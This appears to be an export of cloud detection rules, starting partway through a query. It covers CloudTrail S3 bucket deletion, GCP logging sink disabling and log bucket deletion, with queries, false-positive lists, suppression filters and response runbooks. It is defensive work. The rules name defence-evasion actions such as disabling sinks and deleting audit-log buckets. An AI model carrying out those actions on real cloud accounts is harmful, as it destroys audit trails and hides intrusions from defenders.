    | where EventName in ("CreateTrail","UpdateTrail","DescribeTrails")
    | extend BucketName = tostring(parse_json(RequestParameters).s3BucketName)
    | where isnotempty(BucketName)
    | distinct BucketName;
AWSCloudTrail
| where TimeGenerated > ago(7d)
| where EventName == "DeleteBucket"
| where isempty(ErrorCode)
| extend BucketName = tostring(parse_json(RequestParameters).bucketName)
| where BucketName in (trail_buckets)
| project TimeGenerated, EventName, BucketName, UserIdentityArn, UserIdentityType, SourceIpAddress, UserAgent, AWSRegion
| order by TimeGenerated desc
source:cloudtrail @evt.name:DeleteBucket @evt.outcome:success @userIdentity.type:(IAMUser OR AssumedRole OR Root)
# log group: /aws/cloudtrail

fields @timestamp, eventName, userIdentity.arn, userIdentity.userName, userIdentity.sessionContext.sessionIssuer.userName, sourceIPAddress, userAgent, awsRegion, requestParameters.bucketName, recipientAccountId
| filter eventSource = "s3.amazonaws.com"
      and eventName in ["DeleteBucket","DeleteBucketPolicy"]
      and not isPresent(errorCode)
| sort @timestamp desc

GCP Cloud Logging sink disabled via UpdateSink AIActions on Objectives High
Detects a Cloud Logging sink being flipped to disabled=true via the logging.sinks.update method (Unit 42 Technique 1 — GCP equivalent of StopLogging). When a sink is the routing point to a customer log bucket or external SIEM, disabling it silently halts the audit trail without deleting any resource. Rationale: Article (Technique 1, Figure 1) names logging.sinks.update with the disabled field flipped to true as the GCP equivalent of CloudTrail StopLogging. The methodName google.logging.v2.ConfigServiceV2.UpdateSink combined with the disabled=true delta on the request payload is the precise audit-log shape — directly observable in Cloud Audit Logs. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Cost-optimisation initiative disabling a noisy sink that doubled-routed to two SIEMs
  • Migration from legacy aggregated sink to org-level sink with a deliberate disable-then-delete pattern
  • Terraform module flipping disabled=true as part of a planned environment teardown
  • Engineer pausing a sink while debugging a downstream Pub/Sub backlog
  • SOC-approved temporary disable during a noisy log-volume incident
Suppression filter
| where PrincipalEmail !endswith "@terraform.iam.gserviceaccount.com" and UserAgent !startswith "google-cloud-sdk"
Response runbook
Step 1 — Triage: identify the principalEmail and callerIp; check whether the sink routes to a log bucket, Pub/Sub topic, BigQuery dataset or external SIEM and confirm whether a change ticket exists. Step 2 — Contain: re-enable the sink (PATCH sink with disabled=false), remove logging.sinks.update from the calling principal if not required, and verify downstream log buckets are still receiving entries. Step 3 — Hunt: pivot on principalEmail for ±2 hours — look for additional UpdateSink calls, DeleteSink, DeleteBucket on log buckets, SetIamPolicy on logging resources, and any service-account key creation. Reconstruct the gap by replaying _Default sink content if the disabled sink was a redirected copy.
GCPAuditLogs
| where TimeGenerated > ago(7d)
| where MethodName == "google.logging.v2.ConfigServiceV2.UpdateSink"
| where Severity != "ERROR"
| extend SinkName = tostring(parse_json(Request).name)
| extend Disabled = tostring(parse_json(Request).sink.disabled)
| extend UpdateMask = tostring(parse_json(Request).updateMask)
| where Disabled =~ "true" or UpdateMask has "disabled"
| project TimeGenerated, MethodName, PrincipalEmail, CallerIp, UserAgent, SinkName, Disabled, UpdateMask, ProjectId
| order by TimeGenerated desc

GCP log bucket deletion entering DELETE_REQUESTED state AIActions on Objectives High
Detects logging.buckets.delete invocations (Unit 42 Technique 2 — GCP equivalent of deleting an S3 trail destination). GCP queues the deletion in a DELETE_REQUESTED state for 7 days, giving defenders a narrow but real recovery window — but the delete request itself is the high-signal event to alert on. Rationale: Article (Technique 2, GCP variant) calls out logging.buckets.delete with the 7-day DELETE_REQUESTED grace period — the methodName google.logging.v2.ConfigServiceV2.DeleteBucket is the exact audit-log emission. The grace period is operationally important: detection at delete-request time still allows UndeleteBucket-based recovery, which the runbook leverages. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1485 T1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Decommissioning of a legacy project after migration to a centralised log bucket
  • Terraform module recycling a per-environment _Default override bucket
  • Cleanup of short-lived project log buckets after a CI/CD ephemeral environment teardown
  • Cost-reduction sweep removing redundant regional log buckets
  • SRE consolidating sinks during a logging-architecture refactor
Suppression filter
| where PrincipalEmail !endswith "@terraform.iam.gserviceaccount.com" and PrincipalEmail !contains "cleanup-bot"
Response runbook
Step 1 — Triage: identify principalEmail, callerIp, the bucket name, and whether any sinks were routing to it (logging.sinks.list); confirm the bucket was not the _Required system bucket and review IAM bindings on logging.buckets.delete. Step 2 — Contain: immediately invoke UndeleteBucket on the resource (available for the full 7-day DELETE_REQUESTED window), remove logging.admin / logging.bucketWriter roles from the calling principal, and snapshot current sink configurations. Step 3 — Hunt: pivot on principalEmail for ±4 hours — correlate with UpdateSink (disable), DeleteSink, SetIamPolicy on the Logging API, and any storage.buckets.delete on archive destinations. If multiple log buckets across projects were deleted by the same principal, treat as a coordinated visibility-destruction event and escalate to IR.
GCPAuditLogs
| where TimeGenerated > ago(7d)
| where MethodName in ("google.logging.v2.ConfigServiceV2.DeleteBucket","google.logging.v2.ConfigServiceV2.UpdateBucket")
| where Severity != "ERROR"
| extend BucketName = tostring(parse_json(Request).name)
| extend LifecycleState = tostring(parse_json(Response).lifecycleState)
| where MethodName has "DeleteBucket" or LifecycleState == "DELETE_REQUESTED"
| project TimeGenerated, MethodName, PrincipalEmail, CallerIp, UserAgent, BucketName, LifecycleState, ProjectId
| order by TimeGenerated desc
